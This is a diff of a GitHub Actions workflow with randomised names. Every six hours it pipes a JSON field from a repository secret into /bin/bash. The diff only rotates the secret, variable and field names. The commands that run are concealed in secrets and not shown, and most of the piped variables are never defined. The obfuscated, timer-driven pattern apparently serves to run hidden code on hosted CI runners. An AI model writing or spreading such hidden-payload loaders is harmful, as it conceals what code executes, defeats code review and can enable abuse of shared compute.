@@ -3,31 +3,28 @@ name: zhangshaoxia4354
 on:
   workflow_dispatch:
   schedule:
-    - cron: '38 0/6 * * *'
-jobs:  # 13172
+    - cron: '27 1/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: zhangshaoxia4354
         env:
-          sqfr3242: ${{ secrets.sqfr3242 }}
+          km577: ${{ secrets.km577 }}
         run: |
-          echo $sqfr3242 | jq -r .bve801 | /bin/bash
-          echo $gvr18 | jq -r .rdbgj372 | /bin/bash
-          echo $fbpc73 | jq -r .gqx7035 | /bin/bash
-          echo $t3 | jq -r .yizte002 | /bin/bash
-          echo $hd8 | jq -r .ssezr1 | /bin/bash
-          echo $f72 | jq -r .zjytx84 | /bin/bash
-          echo $bvlt54 | jq -r .qhtns908 | /bin/bash
-          echo $wx8897 | jq -r .xib7 | /bin/bash
-          echo $f528 | jq -r .kbcuz5 | /bin/bash
-          echo $is01223 | jq -r .xyfed9 | /bin/bash
-          echo $zfts72543 | jq -r .wex3922 | /bin/bash
-          echo $qaj6 | jq -r .wva1 | /bin/bash
-          echo $sfzps22909 | jq -r .rv204 | /bin/bash
-          echo $jnh3670 | jq -r .p2 | /bin/bash
-          echo $inc862 | jq -r .x3 | /bin/bash
-          echo $gxby6 | jq -r .qie55887 | /bin/bash
+          echo $km577 | jq -r .yvkk713 | /bin/bash
+          echo $fy2 | jq -r .wktok748 | /bin/bash
+          echo $sday96 | jq -r .ckjhv42205 | /bin/bash
+          echo $nhzb02 | jq -r .o363 | /bin/bash
+          echo $utwa752 | jq -r .ehh8 | /bin/bash
+          echo $hn113 | jq -r .zz0823 | /bin/bash
+          echo $gieez122 | jq -r .bhg980 | /bin/bash
+          echo $rteo7495 | jq -r .dt4992 | /bin/bash
+          echo $oib6 | jq -r .tvmy2853 | /bin/bash
+          echo $jfuob7506 | jq -r .lnc99 | /bin/bash
+          echo $ernc3 | jq -r .dhae68 | /bin/bash
+          echo $skfk7625 | jq -r .w225 | /bin/bash
+          echo $sju2 | jq -r .x0805 | /bin/bash
 
